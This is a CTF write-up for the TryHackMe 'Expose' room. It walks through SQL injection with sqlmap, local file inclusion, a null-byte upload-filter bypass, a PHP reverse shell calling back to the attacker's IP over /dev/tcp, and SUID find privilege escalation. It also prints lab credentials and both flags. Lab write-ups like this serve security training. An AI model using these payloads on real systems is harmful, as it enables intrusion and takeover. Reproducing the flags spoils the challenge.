---
title: "TryHackMe - Expose"
date: 2025-04-07 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [sqlmap, reverse shell, burpsuite , sql injection, LFI, SUID, GTFOBins ]

---
## Introduction

[This challenge](https://tryhackme.com/room/expose) provides a practical way to test skills in penetration testing and red teaming.


## Reconnaissance
The first step in any reconnaissance process is to run an **Nmap** scan to gather information about the target system. I used the following command:

```console
┌──(kali㉿kali)-[~]
└─$ nmap -p- -T4 -sV 10.10.208.188 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 09:03 EDT
Nmap scan report for 10.10.208.188
Host is up (0.070s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
1883/tcp open  mosquitto version 1.6.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.15 seconds

```
Next, I scan the directories using **Gobuster**

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.10.208.188:1337 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.208.188:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/admin                (Status: 301) [Size: 321] [--> http://10.10.208.188:1337/admin/]
/admin_101            (Status: 301) [Size: 325] [--> http://10.10.208.188:1337/admin_101/]
/javascript           (Status: 301) [Size: 326] [--> http://10.10.208.188:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 326] [--> http://10.10.208.188:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 280]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```

After accessing the **admin_101** page, I notice that the account's email address is already pre-filled. For further analysis, I intercept the HTTP request using **Burp Suite**.
![Burp](/images/expose/1.jpg)


```yaml
POST /admin_101/includes/user_login.php HTTP/1.1
Host: 10.10.208.188:1337
Content-Length: 36
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Origin: http://10.10.208.188:1337
Referer: http://10.10.208.188:1337/admin_101/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=h1vllt2ifu3i1atrcqf5vn5kne
Connection: keep-alive

email=hacker%40root.thm&password=123
```


I export the intercepted request from Burp Suite to a .txt file, which I then pass to **sqlmap** to perform an **SQL Injection** attack and retrieve the contents of selected tables from the vulnerable database.

```console
┌──(kali㉿kali)-[~/Desktop/expose]
└─$ sqlmap -r request.txt  --dump 
```

```console
---
[09:25:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[09:25:05] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[09:25:05] [INFO] fetching current database
[09:25:05] [INFO] retrieved: 'expose'
[09:25:05] [INFO] fetching tables for database: 'expose'
[09:25:06] [INFO] retrieved: 'config'
[09:25:06] [INFO] retrieved: 'user'
[09:25:06] [INFO] fetching columns for table 'user' in database 'expose'
[09:25:06] [INFO] retrieved: 'created'
[09:25:06] [INFO] retrieved: 'timestamp'
[09:25:06] [INFO] retrieved: 'email'
[09:25:06] [INFO] retrieved: 'varchar(512)'
[09:25:06] [INFO] retrieved: 'id'
[09:25:06] [INFO] retrieved: 'int'
[09:25:06] [INFO] retrieved: 'password'
[09:25:07] [INFO] retrieved: 'varchar(512)'
[09:25:07] [INFO] fetching entries for table 'user' in database 'expose'
[09:25:07] [INFO] retrieved: '2023-02-21 09:05:46'
[09:25:07] [INFO] retrieved: 'hacker@root.thm'
[09:25:07] [INFO] retrieved: '1'
[09:25:07] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+

[09:25:07] [INFO] table 'expose.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.208.188/dump/expose/user.csv'                                                                                   
[09:25:07] [INFO] fetching columns for table 'config' in database 'expose'
[09:25:07] [INFO] retrieved: 'id'
[09:25:07] [INFO] retrieved: 'int'
[09:25:07] [INFO] retrieved: 'password'
[09:25:08] [INFO] retrieved: 'text'
[09:25:08] [INFO] retrieved: 'url'
[09:25:08] [INFO] retrieved: 'text'
[09:25:08] [INFO] fetching entries for table 'config' in database 'expose'
[09:25:08] [INFO] retrieved: '/file1010111/index.php'
[09:25:08] [INFO] retrieved: '1'
[09:25:08] [INFO] retrieved: '69c66901194a6486176e81f5945b8929'
[09:25:08] [INFO] retrieved: '/upload-cv00101011/index.php'
[09:25:09] [INFO] retrieved: '3'
[09:25:09] [INFO] retrieved: '// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z'
[09:25:09] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[09:25:18] [INFO] writing hashes to a temporary file '/tmp/sqlmap06u5qy2p43538/sqlmaphashes-0uk688jc.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[09:25:23] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[09:25:29] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[09:25:30] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[09:25:30] [INFO] starting 2 processes 
[09:25:33] [INFO] cracked password 'easytohack' for hash '69c66901194a6486176e81f5945b8929'                
Database: expose                                                                                           
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+

[09:25:42] [INFO] table 'expose.config' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.208.188/dump/expose/config.csv'                                                                                 
[09:25:42] [WARNING] HTTP error codes detected during run:
414 (Request-URI Too Long) - 1 times
[09:25:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.208.188'                                                                                                         

[*] ending @ 09:25:42 /2025-04-07/

```


During the **Nmap** scan, the tool located two tables: user and config. In the user table, user data was found along with the password stored in plain text. In the config table, a password hash was discovered, which was successfully cracked to the value **easytohack** The analysis also revealed a hidden path accessible only to selected users.

I navigate to the discovered address **/file1010111/index.php** and log in with the found password. After logging in, I see the following page.

![/file10101111](/images/expose/2.jpg)

In the page source, I found the following hint. **"Try file or view as GET parameters?**"

```
<!-- Main Content -->
<main class=" mx-auto py-8  min-h-[80vh] flex items-center justify-center gap-10 flex-col xl:flex-row">
 <p class="mb-4"><strong>Parameter Fuzzing is also important :)  or Can you hide DOM elements? <strong></p><span  style="display: none;">Hint: **Try file or view as GET parameters?**</span>
 ```

Based on my observations of the application's behavior, I suspect a **[Local File Inclusion (LFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)** vulnerability. I modify the URL by adding the parameter **?file=/etc/passwd**, which allows me to read the contents of this file. The server's response confirms the presence of the vulnerability – I receive the following result:

![/file10101111/index.php?file=/etc/passwd](/images/expose/3.png)


Among the list of users, the account **zeamkish** catches my attention. I then proceed to the previously identified resource at **/upload-cv00101011/index.php** to continue penetrating the system.

![/upload-cv00101011](/images/expose/4.jpg)


I log in using the discovered username and looking at the page source, I find the validate() function.


```console
function validate(){

 var fileInput = document.getElementById('file');
  var file = fileInput.files[0];
  
  if (file) {
    var fileName = file.name;
    var fileExtension = fileName.split('.').pop().toLowerCase();
    
    if (fileExtension === 'jpg' || fileExtension === 'png') {
      // Valid file extension, proceed with file upload
      // You can submit the form or perform further processing here
      console.log('File uploaded successfully');
	  return true;
    } else {
      // Invalid file extension, display an error message or take appropriate action
      console.log('Only JPG and PNG files are allowed');
	  return false;
    }
  }
}
```

The **validate()** function is designed to validate the file uploaded by the user, checking whether it has the correct extension. If the file extension is valid (i.e., .jpg or .png), the user is allowed to proceed with uploading the file. Otherwise, the function returns an error, stating that only JPG and PNG files are allowed. However, the function only checks the file extension (e.g., .jpg or .png) and does not verify the MIME type, which is also an important security aspect. Although the user can change the file extension to .jpg, the file could actually be a PHP, HTML, or another type that could pose a security risk.

By uploading a file named **reverseshell.php.png**, it's possible to bypass this function if the server does not check the MIME type of the file. Since the extension is valid (.png), the file will pass the extension check, but the actual content could be a malicious PHP file capable of executing a reverse shell when accessed.

I send a test file named **test.png** and intercept its request.

![burptestfile](/images/expose/5.png)

From the source code analysis, it appears that uploaded files are saved in the **/upload_thm_1001** directory. I leverage this functionality to upload a file containing a reverse shell, which will allow me to establish a reverse connection and take over the remote shell.

My reverse shell below
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.21.77/4444 0>&1'"); ?>
```

While uploading the reverse shell file, I intercept the HTTP request using **Burp Suite**. I then edit the request, analyzing its content for hexadecimal-encoded values corresponding to the .png extension. The goal of this modification is to craft the request in such a way that it bypasses the file type validation mechanisms and allows the upload of a file with the embedded shell.

![beforediting](/images/expose/6.jpg)

After locating the byte sequence corresponding to the .png extension in the request content, I replace it with the value **00**, effectively invalidating the original extension. I then send the modified request using **Burp Suite**.

![aftereding](/images/expose/7.png)

My script was successfully sent.

![success](/images//expose/8.jpg)

I am starting the listener port on my machine.
```console
nc -lvnp 4444
```

After navigating to the **/upload_thm_1001** directory, where the uploaded file was saved, I execute the reverse shell, which allows me to gain a remote shell on the system.

![upload_thm_1001](/images/expose/9.png)


## User flag 

After establishing the connection, I can now begin searching for the first flag.

```console
www-data@ip-10-10-208-188:/home/zeamkish$ ls
ls
flag.txt
ssh_creds.txt
www-data@ip-10-10-208-188:/home/zeamkish$ cat ssh_creds.txt
cat ssh_creds.txt
SSH CREDS
zeamkish
easytohack@123
www-data@ip-10-10-208-188:/home/zeamkish$ 

```
I obtained the login credentials for the user **zeamkish** via SSH. I log in and proceed to read the user's flag.

```console
zeamkish@ip-10-10-208-188:~$ cd /home
zeamkish@ip-10-10-208-188:/home$ ls
ubuntu  zeamkish
zeamkish@ip-10-10-208-188:/home$ cd zeamkish
zeamkish@ip-10-10-208-188:~$ ls
flag.txt  ssh_creds.txt
zeamkish@ip-10-10-208-188:~$ cat flag.txt
THM{USER_FLAG_1231_EXPOSE}
zeamkish@ip-10-10-208-188:~$ 
```

**FLAG : THM{USER_FLAG_1231_EXPOSE}**


## Root Access

I proceed with the privilege escalation attempt. The first step is to search for SUID files that I can use for escalation.

```
find / -perm -u=s -type f 2>/dev/null

```

```console
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/nano
/usr/bin/su
/usr/bin/fusermount
/usr/bin/find
/usr/bin/mount
```

By analyzing the list of files with **SUID** permissions, I compare them with the database from [GTFOBins](https://gtfobins.github.io) for known privilege escalation vectors. I discover that the find command is listed as a vulnerable tool and has the SUID bit set, allowing it to be used for privilege escalation, as detailed in the documentation:

```console
usr/bin/find ./find . -exec /bin/sh -p \; -quit
```
After successfully exploiting the vulnerability, I gained root privileges, allowing me to access the root user's flag.
```
# cd /root
# ls
flag.txt  snap
# cat flag.txt
THM{ROOT_EXPOSED_1001}
# 
```

**FLAG : THM{ROOT_EXPOSED_1001}**